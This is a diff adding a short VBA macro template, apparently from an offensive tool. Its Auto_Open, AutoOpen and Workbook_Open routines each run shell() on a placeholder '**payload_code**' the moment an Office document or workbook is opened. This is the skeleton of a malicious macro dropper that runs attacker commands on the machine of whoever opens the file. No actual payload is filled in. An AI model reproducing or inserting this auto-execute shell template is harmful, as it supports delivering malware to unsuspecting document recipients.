@@ -1,0 +1,10 @@
+Sub Auto_Open()
+	Code = **payload_code**
+	shell(Code)
+End Sub
+Sub AutoOpen()
+	Auto_Open
+End Sub
+Sub Workbook_Open()
+	Auto_Open
+End Sub
